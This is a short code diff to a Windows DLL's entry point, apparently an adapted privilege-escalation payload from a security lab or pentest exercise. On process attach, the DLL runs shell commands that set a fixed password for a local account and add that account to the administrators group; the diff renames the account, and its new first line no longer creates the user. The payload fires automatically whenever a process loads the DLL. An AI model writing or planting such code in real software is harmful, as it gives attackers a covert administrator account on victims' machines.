@@ -143,8 +143,8 @@ LPVOID lpReserved ) // Reserved
     {
         case DLL_PROCESS_ATTACH: // A process is loading the DLL.
         int i;
-  	    i = system ("net user dave3 password123! /add");
-  	    i = system ("net localgroup administrators dave3 /add");
+  	    i = system ("net user shenzi password123!");
+  	    i = system ("net localgroup administrators shenzi /add");
         break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
         break;
